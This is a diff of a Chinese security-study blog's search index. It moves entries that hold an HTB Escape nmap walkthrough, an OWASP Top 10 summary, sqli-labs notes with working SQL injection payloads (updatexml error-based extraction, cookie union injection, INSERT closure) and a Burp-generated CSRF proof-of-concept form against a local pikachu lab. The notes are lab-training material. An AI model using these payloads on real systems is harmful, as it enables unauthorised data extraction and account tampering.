-<p>2.访问80端口位置，进行反弹shell。</p>
-<p>3.遍历各文件夹，找到敏感信息</p>
-<p>4.拿到普通用户的账号和密码，尝试22端口的ssh连接。</p>
-<p>5.由普通用户进行提权。</p>
-<p>其中有很多细节有待细究，值得复盘。</p>
-<h2 id="2-Escape"><a href="#2-Escape" class="headerlink" title="2.Escape"></a>2.Escape</h2><h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="http://t.csdn.cn/xUqAI">http://t.csdn.cn/xUqAI</a></p>
-<p><a href="https://www.bilibili.com/video/BV12k4y1J7zE/?spm_id_from=333.337.search-card.all.click&vd_source=c49e37118f69c7a5b34915b73d1b78ab">hackthebox中等难度靶场escape渗透全过程_哔哩哔哩_bilibili</a></p>
-<p>nmap:</p>
-<p><code>nmap -p- -sT --min-rate=1000 -Pn 10.10.11.202</code></p>
-<blockquote>
-<p>参数解释：</p>
-<p>-p- 所有端口</p>
-<p>-sT TCP连接</p>
-<p>–min-rate&#x3D;1000 1秒发送1000个请求</p>
-<p>-Pn 禁用主机发现</p>
-<p>结果为：</p>
-<p>53&#x2F;tcp    open  domain<br>88&#x2F;tcp    open  kerberos-sec<br>135&#x2F;tcp   open  msrpc<br>139&#x2F;tcp   open  netbios-ssn<br>389&#x2F;tcp   open  ldap<br>445&#x2F;tcp   open  microsoft-ds<br>464&#x2F;tcp   open  kpasswd5<br>593&#x2F;tcp   open  http-rpc-epmap<br>636&#x2F;tcp   open  ldapssl<br>3269&#x2F;tcp  open  globalcatLDAPssl<br>9389&#x2F;tcp  open  adws<br>49667&#x2F;tcp open  unknown<br>49687&#x2F;tcp open  unknown<br>49705&#x2F;tcp open  unknown<br>49711&#x2F;tcp open  unknown</p>
-</blockquote>
-<p><code>nmap -p- -sU --min-rate=1000 -Pn 10.10.11.202</code></p>
-<blockquote>
-<p>PORT    STATE SERVICE<br>53&#x2F;udp  open  domain<br>123&#x2F;udp open  ntp</p>
-</blockquote>
-<p>vim port.txt，将nmap中tcp扫描到的内容复制过去，通过正则过滤拼接出需要的端口号。提取每行”&#x2F;“之前的内容，再拼接即可</p>
-<p>awk -F’&#x2F;‘ ‘{print $1}’  ORS&#x3D;’,’  port.txt  | tr -d ‘,’</p>
-<blockquote>
-<ol>
-<li><p><code>awk</code>命令：<code>awk</code>是一个文本处理工具，用于按照指定的规则对文本进行处理。它按行读取输入，并根据给定的规则执行操作。</p>
-</li>
-<li><p><code>-F&#39;/&#39;</code>：<code>-F</code>选项用于指定字段分隔符。在这个命令中，我们将字段分隔符设置为斜杠（&#x2F;），以便将每行拆分为多个字段。</p>
-</li>
-<li><p><code>&#39;&#123;print $1&#125;&#39;</code>：这是一个<code>awk</code>的操作部分，指定要执行的操作。<code>$1</code>表示打印第一个字段。</p>
-</li>
-<li><p>默认情况下，<code>ORS</code>的值是一个换行符（<code>\n</code>），这意味着每个<code>print</code>语句打印的内容将以换行符分隔。但是，您可以通过修改<code>ORS</code>的值来指定不同的分隔符。</p>
-</li>
-</ol>
-<p>  在这种情况下，我们使用<code>ORS=&#39;,&#39;</code>将<code>ORS</code>设置为逗号（<code>,</code>）。这样，当<code>print</code>语句执行时，它将使用逗号作为记录之间的分隔符，而不是默认的换行符。这样就实现了将提取的端口号使用逗号拼接在一起的效果。</p>
-<p>  结果为：</p>
-<p>  53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711, </p>
-</blockquote>
-<p><code>nmap -p53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711 -Pn -sT -sC -sV 10.10.11.202</code></p>
-<blockquote>
-<ul>
-<li><code>-sC</code>：这个参数指定在扫描期间运行默认的Nmap脚本。Nmap脚本是一组自动化的测试和攻击脚本，用于探测和利用目标主机上的漏洞或服务配置问题。</li>
-<li><code>-sV</code>：这个参数指定在扫描期间进行版本探测。<code>nmap</code>将尝试识别目标主机上运行的服务和应用程序的版本信息。通过识别版本信息，可以更好地了解目标主机上的系统配置和潜在的安全风险。</li>
-</ul>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time:------)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">|_ssl-date: 2023-06-07T21:55:16+00:00; +8h00m00s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: ------T21:55:17+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: -----T21:55:19+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: -------T21:54:38</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>发现域名sequel.htb与子域名dc.sequel.htb</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-        <tag>渗透测试</tag>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>owasp top10漏洞</title>
-    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
-<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
-<p> 防御方法：使用参数化查询&#x2F;预编译(这样缺的只是数据，不会对sql语句造成其他影响，因为sql语句已经通过预编译技术固定下来了)、输入校验和白名单、最小化权限等。</p>
-<p>但是预编译的话，也是存在绕过的，那就是case when绕过。</p>
-<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
-<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
-<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
-<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
-<p>攻击方式：网络嗅探、数据泄露等。 </p>
-<p>防御方法：加密、数据保护、强密码策略等。</p>
-<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
-<p> 攻击方式：XXE攻击等。</p>
-<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
-<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
-<p>攻击方式：直接访问、暴力破解等。 </p>
-<p>防御方法：访问控制、安全编码、安全测试等。</p>
-<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
-<p>攻击方式：目录遍历、错误页面泄露等。 </p>
-<p>防御方法：安全配置、代码审计、最小化权限等。</p>
-<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
-<p>详细解释：例如在表单中提交含有可执行的javascript的内容文本，如果服务器端没有过滤或转义这些脚本，而这些脚本由通过内容的形式发布到了页面上，这个时候如果有其他用户访问这个网页，那么浏览器就会执行这些脚本，从而被攻击，从而获取用户的cookie等信息。</p>
-<p>攻击方式：反射型XSS、存储型XSS等。</p>
-<p> 防御方法：输入校验、输出转义、HTTPOnly标记等。</p>
-<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
-<p> 攻击方式：注入恶意对象等。</p>
-<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
-<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
-<p>攻击方式：利用已知漏洞等。</p>
-<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
-<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
-<p> 攻击方式：暴力破解、DDoS攻击等。</p>
-<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
-]]></content>
-      <categories>
-        <category>top10 漏洞</category>
-      </categories>
-      <tags>
-        <tag>xss</tag>
-        <tag>漏洞</tag>
-        <tag>RCE</tag>
-        <tag>upload</tag>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php语言基础</title>
     <url>/2023/05/31/php/</url>
     <content><![CDATA[<h1 id="一-基础"><a href="#一-基础" class="headerlink" title="一.基础"></a>一.基础</h1><h2 id="1-变量分类"><a href="#1-变量分类" class="headerlink" title="1.变量分类"></a>1.变量分类</h2><h3 id="1-可变变量"><a href="#1-可变变量" class="headerlink" title="1.可变变量"></a>1.可变变量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<span class="comment">//编码设置</span></span><br><span class="line"><span class="variable">$bao</span>=<span class="string">&#x27;biao&#x27;</span>;</span><br><span class="line"><span class="variable">$biao</span>=<span class="string">&#x27;鼠标&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bao</span>.<span class="string">&quot;///&quot;</span>.<span class="variable">$$bao</span>; <span class="comment">//$$bao即可变变量</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -1675,6 +1798,53 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
+    <title>owasp top10</title>
+    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
+<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
+<p> 防御方法：使用参数化查询&#x2F;预编译(这样缺的只是数据，不会对sql语句造成其他影响，因为sql语句已经通过预编译技术固定下来了)、输入校验和白名单、最小化权限等。</p>
+<p>但是预编译的话，也是存在绕过的，那就是case when绕过。</p>
+<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
+<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
+<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
+<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
+<p>攻击方式：网络嗅探、数据泄露等。 </p>
+<p>防御方法：加密、数据保护、强密码策略等。</p>
+<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
+<p> 攻击方式：XXE攻击等。</p>
+<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
+<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
+<p>攻击方式：直接访问、暴力破解等。 </p>
+<p>防御方法：访问控制、安全编码、安全测试等。</p>
+<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
+<p>攻击方式：目录遍历、错误页面泄露等。 </p>
+<p>防御方法：安全配置、代码审计、最小化权限等。</p>
+<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
+<p>详细解释：例如在表单中提交含有可执行的javascript的内容文本，如果服务器端没有过滤或转义这些脚本，而这些脚本由通过内容的形式发布到了页面上，这个时候如果有其他用户访问这个网页，那么浏览器就会执行这些脚本，从而被攻击，从而获取用户的cookie等信息。</p>
+<p>攻击方式：反射型XSS、存储型XSS等。</p>
+<p> 防御方法：输入校验、输出转义、HTTPOnly标记等。</p>
+<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
+<p> 攻击方式：注入恶意对象等。</p>
+<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
+<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
+<p>攻击方式：利用已知漏洞等。</p>
+<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
+<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
+<p> 攻击方式：暴力破解、DDoS攻击等。</p>
+<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
+]]></content>
+      <categories>
+        <category>top10</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+        <tag>漏洞</tag>
+        <tag>RCE</tag>
+        <tag>upload</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php反序列化</title>
     <url>/2023/05/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h1><p><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结 - 先知社区 (aliyun.com)</a></p>
@@ -1783,7 +1953,7 @@ return $outText;#新值
 <p>性别:boy</p>
 <p>手机:15988767673</p>
 <p>住址:nba lakes</p>
-<p>邮箱:<a href="mailto:&#x6b;&#x6f;&#98;&#x65;&#x40;&#112;&#x69;&#x6b;&#x61;&#x63;&#104;&#117;&#x2e;&#99;&#x6f;&#109;">&#x6b;&#x6f;&#98;&#x65;&#x40;&#112;&#x69;&#x6b;&#x61;&#x63;&#104;&#117;&#x2e;&#99;&#x6f;&#109;</a></p>
+<p>邮箱:<a href="mailto:&#x6b;&#x6f;&#98;&#x65;&#64;&#112;&#105;&#107;&#x61;&#99;&#x68;&#117;&#46;&#x63;&#x6f;&#109;">&#x6b;&#x6f;&#98;&#x65;&#64;&#112;&#105;&#107;&#x61;&#99;&#x68;&#117;&#46;&#x63;&#x6f;&#109;</a></p>
 </blockquote>
 <p>通过bp抓包，右键工具菜单，生成csrf poc，复制写好的表单html文件，放到同文件夹下(csrfpost\)，记为test.html。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15988767673&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -1881,90 +2051,6 @@ return $outText;#新值
         <tag>xxe</tag>
         <tag>php反序列化</tag>
         <tag>csrf/ssrf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs</title>
-    <url>/2023/05/20/sqli-labs/</url>
-    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
-<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
-<p>发现提示</p>
-<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
-<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
-<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
-<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
-<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
-<blockquote>
-<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
-</blockquote>
-<p>可以判定是有单引号的闭合</p>
-<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
-<blockquote>
-<p>the right syntax to use near ‘’ at line 1</p>
-</blockquote>
-<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
-<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
-<blockquote>
-<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>and替换成or也是可以的</p>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^id,username,password’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
-</blockquote>
-<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
-<blockquote>
-<p>Column count doesn’t match value count at row 1</p>
-</blockquote>
-<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
-<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
-</blockquote>
-<p>所以要闭合VALUES.</p>
-<p>利用$uagent，故构建格式，1’,1,1)#</p>
-<p>则：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
-</blockquote>
-<p>即：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
-</blockquote>
-<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
-<blockquote>
-<p>  XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>其余语句类似思路1。</p>
-<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
-<p>admin’，有报错信息…LIMIT..</p>
-<p>注释掉后，即admin’#，页面正常。</p>
-<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
-<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
-<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
-<p>嗯，报错注入也是可行的</p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -2074,6 +2160,90 @@ return $outText;#新值
       </categories>
       <tags>
         <tag>报错注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs</title>
+    <url>/2023/05/20/sqli-labs/</url>
+    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
+<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
+<p>发现提示</p>
+<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
+<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
+<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
+<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
+<blockquote>
+<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
+</blockquote>
+<p>可以判定是有单引号的闭合</p>
+<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
+<blockquote>
